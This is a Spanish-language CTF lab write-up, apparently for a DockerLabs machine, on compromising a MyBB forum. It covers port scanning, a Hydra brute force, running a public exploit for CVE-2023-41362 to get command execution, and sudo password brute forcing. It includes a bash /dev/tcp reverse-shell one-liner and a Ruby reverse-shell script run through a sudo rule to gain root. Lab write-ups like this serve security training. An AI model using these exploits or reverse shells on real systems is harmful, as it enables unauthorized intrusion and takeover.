# Fase 1- Tanteo
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/07f2096d-38a2-4e6b-9cef-0e6c1517fa85)
En esta fase inicial, realizamos un escaneo de puertos para identificar los servicios disponibles en la máquina objetivo. Utilizamos la herramienta Nmap con una serie de opciones para obtener información detallada y realizar un análisis exhaustivo de los puertos abiertos.
### Comando Nmap utilizado:

`sudo nmap -p- --open -sS -sC -sV --min-rate 5000 -vvv -n -Pn 192.168.52.139 -oN Escaneo`

### Detalles del Comando:

- `sudo nmap -p- --open -sS -sC -sV --min-rate 5000 -vvv -n -Pn 192.168.52.139 -oN Escaneo`
- `-p-`: Escaneo de todos los puertos.
- `--open`: Muestra solo puertos abiertos.
- `-sS`: Escaneo SYN para determinar el estado de los puertos.
- `-sC`: Activa detección de versiones y vulnerabilidades.
- `-sV`: Escaneo de versiones de servicios.
- `--min-rate 5000`: Velocidad mínima de escaneo.
- `-vvv`: Verbosidad muy alta para información detallada.
- `-n`: Desactiva la resolución de DNS.
- `-Pn`: Ignora la detección de hosts en línea.
- `192.168.52.139`: IP de la máquina objetivo.
- `-oN Escaneo`: Guarda resultados en archivo "Escaneo".

### Resultados:

#### Puertos Abiertos:

1.  **80/tcp(HTTP):** Apache httpd 2.4.59

### Puerto 80
Al identificar que el puerto 80 estaba abierto durante el escaneo, se procedió a ingresar la dirección IP en el navegador. Sobre un foro de debate.
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/3b3ba29a-6425-4af3-9fc0-4f5c6f6267ea)

![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/01fabfb1-e9f4-450e-b7fb-1cc745c54b6f)
Tenemos que agregar `panel.mybb.dl` a nuestro `/etc/hosts`.

![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/b77ffc64-b9fb-4f2d-8543-852e4ea79e07)
Y ya tenemos una especie de foro...


# Fase 2- Expl0ración

#### FeroxBuster
```python
301      GET        9l       28w      314c http://panel.mybb.dl/admin
```
Encontramos un /admin.

![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/6c354462-68e3-415f-b34a-90d7eb2510c7)
Nos dirige a un panel de login.

#### Admin
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/c489345f-6a50-4ff9-be39-b3db86d013bd)

Buscando algún posible usuario para realizar fuerza bruta encuentro un mensaje que dice `Please welcome our newest member, admin` básicamente en español dice que le den la bienvenida a un nuevo usuario llamado `admin`.

# Fase 3- Explotación

#### Hydra
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/519954b5-3dd2-4c39-9b88-20699cffd23c)
Hicimos un ataque de fuerza bruta al panel de login con la herramienta Hydra, pero nos dio muchas contraseñas, probaremos una a una hasta que entre.

![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/15fa90f8-8096-4398-b6c2-ddd37794619d)

Pudimos entrar probando contraseñas, la contraseña que fue efectiva es: `babygirl`.

#### MyBB
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/3784e32a-cb64-4b14-971e-9b7a20b8eb96)

La versión de MyBB es 1.8.35.

![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/846ff4c3-0e01-4bdb-84ca-e5d65fd7ae5e)
Es vulnerable a un `TEMPLATE CODE INJECTION`.

![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/832246ee-5f60-4317-885c-91806fc5d4cc)
Buscamos el `CVE-2023-41362` y encontramos este repositorio en GitHub con un exploit. https://github.com/SorceryIE/CVE-2023-41362_MyBB_ACP_RCE

Lo clonamos y lo mandamos de la siguiente forma:
```python
> sudo git clone https://github.com/SorceryIE/CVE-2023-41362_MyBB_ACP_RCE.git
> cd CVE-2023-41362_MyBB_ACP_RCE
> python3 exploit.py http://panel.mybb.dl/ admin babygirl
[*] Logging into http://panel.mybb.dl/admin/ as admin
WARNING: Template already contains our payload code? Skipping to sending commands...
[*] Testing code exec...
[*] Shell is working
[*] Special commands: exit (quit), remove (removes backdoor), config (prints mybb config), dump (dumps user table)
Enter Command> id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

Enter Command> whoami
www-data
```
Y ya estamos dentro!.

Nos enviamos este comando para darnos una reverse shell y poder hacer el tratamiento de la TTY y estar mas comodos:
```python
Atacante> nc -nlvp puerto
Enter Command> bash -c "bash >& /dev/tcp/ip/puerto 0>&1"
```
Primero nos ponemos en modo escucha con este comando: `nc -nlvp 443` y después nos enviamos la reverse shell.

# Fase 4- Privilegios

#### sudo -l
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/c31231ee-cc7e-4654-8555-6c85992c353b)
Despues del tratamiento de la TTY, Debido a que no podemos ejecutar ningún binario como ningún usuario, vamos a realizar fuerza bruta desde la misma maquina con este script: https://github.com/Maalfer/Sudo_BruteForce

#### Brute Force
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/3bc44575-ca28-4e77-82e7-a2fc2779e006)
Nos pasamos el script a nuestra maquina atacante.

Y en la maquina victima en el directorio `/var/www/mybb` creamos una carpeta llamada `brute`.
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/c6662533-0871-402c-ad27-098384cdaacf)
Y en esa misma carpeta con wget nos descargamos el archivo.


En nuestra maquina atacante creamos un diccionario con las primeras 200 palabras del diccionario rockyou:
```python
Atacante> shuf -n 200 rockyou.txt > mini_rockyou.txt
Atacante> python3 -m http.server 80
www-data@e109354694fb:/var/www/mybb/brute$ wget 192.168.1.9/mini_rockyou.txt
```
lo compartimos a la máquina víctima y lo descargamos.

```python
www-data@e109354694fb:/var/www/mybb/brute$ bash Linux-Su-Force.sh alice mini_rockyou.txt
Contraseña encontrada para el usuario alice: tinkerbell
```
Y encontramos la contraseña!.

#### Alice
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/fdaa2381-0662-48a7-8bd8-8664a5d4444e)

Como el usuario `alice` podemos ejecutar todo lo que este dentro del directorio `/home/alice/scripts/*.rb` osea cualquier archivo que este en el directorio `scripts` que termine con `.rb` lo podemos ejecutar como usuario root.


Creamos un archivo con el siguiente codigo en nuestra maquina atacante:
```ruby
#!/usr/bin/env ruby
require 'socket'

server_ip = '192.168.1.9'
server_port = 443

begin
  socket = TCPSocket.new(server_ip, server_port)

   [STDIN, STDOUT, STDERR].each do |io|
      io.reopen(socket)
    end

   exec "/bin/bash"
rescue => e
  puts "Error: #{e}"
end
```

Luego nos lo pasamos a nuestra maquina victima:
```python
Atacante > python3 -m http.server 80
Victima> wget 192.168.1.9/rev.rb
```

Nos ponemos en modo escucha y ejecutamos:
```python
Atacante > nc -nlvp 443
Victima> chmod +x rev.rb 
Victima> sudo ./rev.rb 
```

![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/266cb0a2-7edc-4ab4-ae77-83827267bcb4)

Y somos root!.
